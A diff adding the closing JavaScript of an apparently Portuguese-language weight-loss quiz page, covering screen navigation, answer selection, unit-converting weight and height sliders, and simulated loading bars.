+                    document.getElementById('screen' + currentScreen).classList.add('active');
+                    updateProgress();
+
+                    // Update name in various screens
+                    const name = document.getElementById('nameInput').value || 'Nome';
+                    if (currentScreen === 6) {
+                        document.getElementById('userName').textContent = name;
+                    }
+                    if (currentScreen === 18) {
+                        document.getElementById('userNameAlert').textContent = name;
+                    }
+                    if (currentScreen === 19) {
+                        document.getElementById('userName2').textContent = name;
+                    }
+
+                    // Start loading animations
+                    if (currentScreen === 16) {
+                        startLoading(1);
+                    }
+                    if (currentScreen === 17) {
+                        startLoading(2);
+                    }
+                }
+            }
+
+            function selectOption(element, category, value) {
+                // Remove selection from siblings
+                const siblings = element.parentNode.children;
+                for (let sibling of siblings) {
+                    sibling.classList.remove('selected');
+                }
+
+                // Add selection to clicked element
+                element.classList.add('selected');
+
+                // Store answer
+                answers[category] = value;
+
+                // Auto advance after short delay
+                setTimeout(() => {
+                    nextScreen();
+                }, 500);
+            }
+
+            function toggleCheckbox(element, value) {
+                const checkbox = element.querySelector('.checkbox');
+                const isSelected = element.classList.contains('selected');
+
+                if (isSelected) {
+                    element.classList.remove('selected');
+                    checkbox.classList.remove('checked');
+                    selectedBenefits = selectedBenefits.filter(b => b !== value);
+                } else {
+                    element.classList.add('selected');
+                    checkbox.classList.add('checked');
+                    selectedBenefits.push(value);
+                }
+
+                // Enable continue button if at least one benefit is selected
+                const continueButton = document.getElementById('benefitsButton');
+                continueButton.disabled = selectedBenefits.length === 0;
+            }
+
+            // Name input validation
+            document.getElementById('nameInput').addEventListener('input', function () {
+                const nameButton = document.getElementById('nameButton');
+                nameButton.disabled = this.value.trim().length === 0;
+            });
+
+            // Slider functionality with expanded ranges
+            function switchUnit(unit, element) {
+                const siblings = element.parentNode.children;
+                for (let sibling of siblings) {
+                    sibling.classList.remove('active');
+                }
+                element.classList.add('active');
+
+                const valueDisplay = document.getElementById('weightValue');
+                if (unit === 'kg') {
+                    valueDisplay.innerHTML = currentWeight + '<span style="font-size: 24px;">kg</span>';
+                } else {
+                    const lbs = Math.round(currentWeight * 2.20462);
+                    valueDisplay.innerHTML = lbs + '<span style="font-size: 24px;">lb</span>';
+                }
+            }
+
+            function switchHeightUnit(unit, element) {
+                const siblings = element.parentNode.children;
+                for (let sibling of siblings) {
+                    sibling.classList.remove('active');
+                }
+                element.classList.add('active');
+
+                const valueDisplay = document.getElementById('heightValue');
+                if (unit === 'cm') {
+                    valueDisplay.innerHTML = currentHeight + '<span style="font-size: 24px;">cm</span>';
+                } else {
+                    const inches = Math.round(currentHeight / 2.54);
+                    valueDisplay.innerHTML = inches + '<span style="font-size: 24px;">pol</span>';
+                }
+            }
+
+            function switchGoalUnit(unit, element) {
+                const siblings = element.parentNode.children;
+                for (let sibling of siblings) {
+                    sibling.classList.remove('active');
+                }
+                element.classList.add('active');
+
+                const valueDisplay = document.getElementById('goalValue');
+                if (unit === 'kg') {
+                    valueDisplay.innerHTML = goalWeight + '<span style="font-size: 24px;">kg</span>';
+                } else {
+                    const lbs = Math.round(goalWeight * 2.20462);
+                    valueDisplay.innerHTML = lbs + '<span style="font-size: 24px;">lb</span>';
+                }
+            }
+
+            function startDrag(event, type) {
+                isDragging = true;
+                dragType = type;
+                event.preventDefault();
+
+                document.addEventListener('mousemove', handleDrag);
+                document.addEventListener('mouseup', stopDrag);
+                document.addEventListener('touchmove', handleDrag);
+                document.addEventListener('touchend', stopDrag);
+            }
+
+            function handleDrag(event) {
+                if (!isDragging) return;
+
+                const slider = document.getElementById(dragType + 'Slider');
+                const rect = slider.getBoundingClientRect();
+                const clientX = event.clientX || (event.touches && event.touches[0].clientX);
+                const x = clientX - rect.left;
+                const percentage = Math.max(0, Math.min(100, (x / rect.width) * 100));
+
+                const thumb = slider.querySelector('.slider-thumb');
+                const fill = slider.querySelector('.slider-fill');
+
+                thumb.style.left = `calc(${percentage}% - 11px)`;
+                fill.style.width = percentage + '%';
+
+                if (dragType === 'weight') {
+                    // Expanded range: 40kg to 150kg
+                    currentWeight = Math.round(40 + (percentage / 100) * 110);
+                    const unit = document.querySelector('#screen12 .unit-button.active').textContent;
+                    const valueDisplay = document.getElementById('weightValue');
+                    if (unit === 'kg') {
+                        valueDisplay.innerHTML = currentWeight + '<span style="font-size: 24px;">kg</span>';
+                    } else {
+                        const lbs = Math.round(currentWeight * 2.20462);
+                        valueDisplay.innerHTML = lbs + '<span style="font-size: 24px;">lb</span>';
+                    }
+                } else if (dragType === 'height') {
+                    // Expanded range: 140cm to 210cm
+                    currentHeight = Math.round(140 + (percentage / 100) * 70);
+                    const unit = document.querySelector('#screen13 .unit-button.active').textContent;
+                    const valueDisplay = document.getElementById('heightValue');
+                    if (unit === 'cm') {
+                        valueDisplay.innerHTML = currentHeight + '<span style="font-size: 24px;">cm</span>';
+                    } else {
+                        const inches = Math.round(currentHeight / 2.54);
+                        valueDisplay.innerHTML = inches + '<span style="font-size: 24px;">pol</span>';
+                    }
+                } else if (dragType === 'goal') {
+                    // Expanded range: 35kg to 120kg
+                    goalWeight = Math.round(35 + (percentage / 100) * 85);
+                    const unit = document.querySelector('#screen14 .unit-button.active').textContent;
+                    const valueDisplay = document.getElementById('goalValue');
+                    if (unit === 'kg') {
+                        valueDisplay.innerHTML = goalWeight + '<span style="font-size: 24px;">kg</span>';
+                    } else {
+                        const lbs = Math.round(goalWeight * 2.20462);
+                        valueDisplay.innerHTML = lbs + '<span style="font-size: 24px;">lb</span>';
+                    }
+                }
+            }
+
+            function stopDrag() {
+                isDragging = false;
+                dragType = '';
+                document.removeEventListener('mousemove', handleDrag);
+                document.removeEventListener('mouseup', stopDrag);
+                document.removeEventListener('touchmove', handleDrag);
+                document.removeEventListener('touchend', stopDrag);
+            }
+
+            // Loading animations
+            function startLoading(screenNum) {
+                let progress = 0;
+                const fillElement = document.getElementById('loadingFill' + screenNum);
+                const percentElement = document.getElementById('loadingPercent' + screenNum);
+
+                const interval = setInterval(() => {
+                    progress += Math.random() * 15;
+                    if (progress >= 100) {
+                        progress = 100;
+                        clearInterval(interval);
+                        setTimeout(() => {
+                            nextScreen();
+                        }, 1000);
+                    }
+
+                    fillElement.style.width = progress + '%';
+                    percentElement.textContent = Math.round(progress) + '%';
+                }, 200);
+            }
+
+            // Touch support for sliders
+            document.addEventListener('touchstart', function (event) {
+                const target = event.target;
+                if (target.classList.contains('slider-thumb')) {
+                    const type = target.closest('[id*="Slider"]').id.replace('Slider', '');
+                    startDrag(event, type);
+                }
+            });
+
+            // Initialize progress
+            updateProgress();
+        </script>
+
+
+</body>
+
+</html>
